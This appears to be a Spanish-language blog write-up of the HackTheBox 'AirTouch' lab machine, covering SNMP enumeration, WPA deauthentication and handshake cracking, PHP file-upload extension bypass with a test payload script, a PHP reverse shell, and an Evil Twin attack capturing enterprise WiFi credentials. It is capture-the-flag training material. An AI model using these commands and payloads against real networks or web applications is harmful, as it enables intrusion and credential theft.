---
layout: post
title: HTB Airtouch Writeup Español 
date: 2026-04-09 
categories: [HTB]
---

![](/assets/images/2026-04-09-htb-Airtouch/portada.png)

# 1. Info
**AirTouch** es una máquina de dificultad **medium** (personalmente creo que debería ser **hard**) de la plataforma HackTheBox.
Esta máquina trata principalmente de hacking de redes WIFI y para resolverla utilizaremos las siguientes técnicas: 
- Filtrado de información a través de **SNMP** expuesto.
- Ataque de deautenticación y captura de **WPA Handshake**.
- Explotación de funcionalidad de subida de archivos.
- Ataque **Evil Twin**.


# 2. Reconocimiento 
## 2.1 Escaneo Inicial

Empiezo enviando una traza **ICMP** con **PING**:  
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_ping.png)

Realizo un escaneo de puertos TCP con **nmap**:  
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_ports.png)

El único puerto abierto es el 22 SSH (no tengo credenciales), por lo que aparentemente, no hay vector de ataque posible.
Sin embargo, haciendo un escaneo por UDP, encuentro otro puerto abierto:

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_udp.png)

Ahora, realizo otro escaneo con nmap para ver que servicio esta corriendo en el puerto 161:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_services.png)

Se trata de un servidor **SNMP** (Simple Network Management Protocol).

## 2.2 Reconocimiento SNMP

Uso **snmpwalk** para descubrir información en el servicio **SNMP**. Como no conozco el *community key* pruebo con "public":
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_snmp.png)

De esta forma, encuentro la contraseña para el usuario "consultant".

# 3. Acceso Inicial

Accedo por **ssh** con las credenciales que acabo de encontrar. Al ejecutar `sudo -l` veo que puedo ejecutar cualquier comando del sistema como **root** sin proporcionar contraseña, por lo que con  `sudo -i` me convierto en root.

Aunque tenga acceso root, desafortunadamente este no es el final de la máquina. Este solo es el punto de entrada a la red.

![](/assets/images/2026-04-09-htb-Airtouch/negro_llorando.gif)

# 4. Pivoting de red

Al acceder al sistema, me encuentro con una imágen llamada **net_diagram.png** que contiene un esquema de la estructura de la red similar a este:   

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_excalidraw_diagram.png)

Como es de esperar, el objetivo es ganar acceso a **AirTouch-Consultant** (el punto actual), pasar por **AirTouch-Internet** y finalmente llegar a **AirTouch-Office**.

Con el comando `ip route` veo la tabla de enrutamiento: 
```ruby
root@AirTouch-Consultant:~# ip route
default via 172.20.1.1 dev eth0 
172.20.1.0/24 dev eth0 proto kernel scope link src 172.20.1.2
```

Y con `ip a` veo las interfaces disponibles:
```ruby
root@AirTouch-Consultant:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if29: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether ce:84:88:eb:8b:d7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0
       valid_lft forever preferred_lft forever
7: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
9: wlan2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
10: wlan3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
11: wlan4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
12: wlan5: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
13: wlan6: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
```
para ver las interfaces de red también podemos usar `iw dev` o `iwconfig`.


## 4.1 AirTouch-Internet

Para ganar acceso a **AirTouch-Internet** necesitamos capturar el **WPA Handshake** de algún usuario para crackear el hash y conseguir el **PSK** (Pre-Shared Key). Para lograr esto también hay que hacer un ataque de deautenticación con el que forcemos a algún usuario a desconectarse de la red, de forma que cuando se vuelva a conectar, capturemos el handshake. 

Primero, me pongo en escucha con **airmon-ng** para obtener el BSSID de la red.

1. `ip link set wlan0 up`
2. `airmon-ng check kill`
3. `airmon-ng start wlan0`
4. `airodump-ng wlan0mon`

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_deauth.png)

Ahora escucho solo en **AirTouch-Internet**:
```ruby
airodump-ng --bssid F0:9F:C2:A3:F1:A7 --channel 6 --write wpa_handshake wlan0mon
```
Ataque de deautenticación:
```bash
aireplay-ng --ignore-negative-one -0 10 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:F1:A7 wlan0mon
```
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_aireplay.png)

Finalmente capturo el apretón:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_deauth_result.png)

Una vez hecho esto, *crackeo* el hash del archivo **wpa_handshake**:
```bash
aircrack-ng wpa_handshake -w /usr/share/wordlists/rockyou.txt
```
Y con esto ya tengo la clave de la red.
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_hash_cracked.png)

Ahora me conecto a la red con **wpa_supplicant**

Genero archivo de configuración:
```bash
wpa_passphrase "AirTouch-Internet" [CONTRASEÑA] > /tmp/internet.conf
```
Me conecto:
```bash
ip link set wlan4 up # Levantar interfaz
wpa_supplicant -B -i wlan4 -c /tmp/internet.conf
```

Recibo dirección IP con **dhclient**:
```bash
dhclient wlan4
```

Ahora ya tengo acceso al segmento 192.168.3.0/24 por wlan4:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_segment1.png)
## 4.2 Subida de Archivos

Con **nmap**, hago un escaneo para descubrir dispositivos:
```bash
nmap -sn 192.168.3.0/24
```

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_net_scan.png)

Realizamo un escaneo a la 192.168.3.1:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_gateway_scan.png)

Parece que tiene un servicio http corriendo así que hago port forwarding al puerto 80 para ver el servicio web:
```bash
ssh -L 4444:192.168.3.1:80 consultant@192.168.3.1
```

Accedemos a la página web:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_login_panel.png)

En primer lugar, no tengo credenciales para el panel de inicio de sesión, sin embargo, es posible que el usuario que *deautentiqué* anteriormente de la red, al reconectarse volviera a iniciar sesión en este mismo panel. En ese caso, el tráfico **http** habría quedado capturado en el archivo **wpa_handshake** anterior.  

Para comprobarlo, abro este archivo en **wireshark** y configuro una clave **wpa-wpd** que me permitirá ver el tráfico encriptado: 


![](/assets/images/2026-04-09-htb-Airtouch/airtouch_wireshark1.png)
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_wireshark2.png)


En el tráfico HTTP encuentro las credenciales y las cookies del usuario:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_wireshark3.png)

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_wireshark4.png)

Ahora accedo con las credenciales que acabo de encontrar y una vez he iniciado sesión, modifico las cookies de forma que el PHPSESSID sea el mismo que el que aparece en **wireshark**, y el *UserRole* sea **admin**.

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_file_upload.png)

Al subir un archivo **.php** da error, así que, uso este sencillo script para probar que extensiones de php alternativas admite:

```python
import requests

php_extensions = [
    "php","php2","php3","php3p","php4","php4p",
    "php5","php5p","php7","php8","phtml","pht",
    "phtm","phps","phar","inc","module","engine","theme"
]

proxy = {"http": "http://localhost:8080"}

def upload(session, extension):
    url = "http://localhost:4444/index.php"
    files = {
        "fileToUpload": (f"test.{extension}", "<?php echo exec('whoami'); ?>", "application/x-php")
    }

    r = session.post(url, files=files, proxies=proxy)
    response = r.text

    return "Sorry, PHP and HTML files are not allowed" not in response


if __name__ == '__main__':
    session = requests.session()
    session.cookies.update({
        "PHPSESSID": "SUSTITUIR PHPSESSID",
        "UserRole": "admin"
        })

    valid_extensions = []

    for extension in php_extensions:
        if upload(session, extension):
            valid_extensions.append(extension)

    print("\nVALID EXTENSIONS:\n")
    for valid in valid_extensions:
        print(f"[+] Extension: {valid}")

```

Las extensiones válidas son:

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_script.png)

Con el siguiente comando de **Bash** pruebo a abrir los diferentes archivos que subido con el *script* anterior y así ver en cuales se interpreta el código **php**:

```bash
for var in php3p php4p php4p php8 phtml phar inc module theme engine ; do response=$(curl -s --cookie "PHPSESSID=SUSTITUIR PHP SESSID; UserRole=admin" http://localhost:4444/uploads/test.$var); if echo "$response" | grep -q "www-data"; then echo "[+] Extensión: $var"; fi ; done
```

Las extensiones con las que se interpreta el código son **phtml** y **phar**, así que, ahora solo hay que subir una *reverse shell* en **php** para ganar acceso al sistema.

### Local Port Forwarding con chisel
En un archivo llamado **h4cked.phar** escribo el contenido de esta [Reverse Shell de PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell.git) y lo subimos.

Hago un local port forwarding con chisel y abro el **h4cked.phar** para recibir la reverse shell.
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_forwarding.png)
mirando el archivo **/var/www/html/login.php** encuentro las credenciales de un usuario *user*:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_login_creds.png)

Y esa es la misma contraseña que la contraseña del sistema.

## Fase 3: AirTouch-Office
El usuario *user* también puede convertirse en **root** sin proporcionar contraseña. 
En el directorio root, en **send_certs.sh** están credenciales para un usuario *remote*:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_remote_user.png)



En el directorio de **certs-backups** se encuentran los certificados de de la red, así que, con el siguiente comando comparto el directorio a la máquina de consultant:
```bash
 scp -r certs-backup consultant@192.168.3.23:/tmp
```

### Evil Twin Attack
Primero me pongo en escucha en todas las bandas para entrar el BSSID de AirTouch-Office:
```bash
airodump-ng --band abg wlan0mon
```
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_evilTwin1.png)

Ahora importo los certificados de **certs-backup**:
```bash
./eaphammer --cert-wizard import --server-cert ../certs-backup/server.crt --ca-cert ../certs-backup/ca.crt --private-key ../certs-backup/server.key
```

Una vez hecho esto ejecuto el Evil-Twin:
```bash
./eaphammer --creds -i wlan4mon -e AirTouch-Office -b AC:8B:A9:F3:A1:13 -c 44 --auth wpa-eap
```
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_evilTwin2.png)
El hash del usuario:
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_evilTwin3.png)
### Crackeamos contraseña
Ahora craqueo el hash con **hashcat**
```bash
hashcat -m 5500 <hash> ../../rockyou.txt
```
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_evilTwin4.png)

### Autenticación en el office

Con la nueva contraseña, creo un archivo de configuración como este (**office.conf**) para conectarme a la red "office":
```ruby
network={
    ssid="AirTouch-Office"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\<usuario>" # Modificar esto
    password="<contraseña>" # Modificar esto
    phase1="peapver=0"
    phase2="auth=MSCHAPV2"
    priority=1
}
```

```shell
wpa_supplicant -B -Dnl80211 -i wlan1 -c office.conf

```

```shell
dhclient wlan1
```

# Escalada Final
Una vez en **AirTouch-Office**, hago un escaneo con `nmap -sn 10.10.10.0/24` para descubrir dispositivos:

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_net_scan_2.png)

Encuentro el 10.10.10.1 y me conecto por ssh usando las credenciales que previamente encontré en el archivo **send_certs.sh**.

Haciendo enumeración del sistema, ejecuto `ps aux` para ver los servicios corriendo:

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_ps_aux.png)

Uno de los servicios corriendo es **hostapd**. A continuación con **find** busco archivos de configuración para este servicio: 

![](/assets/images/2026-04-09-htb-Airtouch/airtouch_paths.png)

En uno de los ficheros se encuentran las credenciales para el usuario **admin**, desde el cual podemos ganar acceso root directamente sin contraseña.
![](/assets/images/2026-04-09-htb-Airtouch/airtouch_pwned.png)


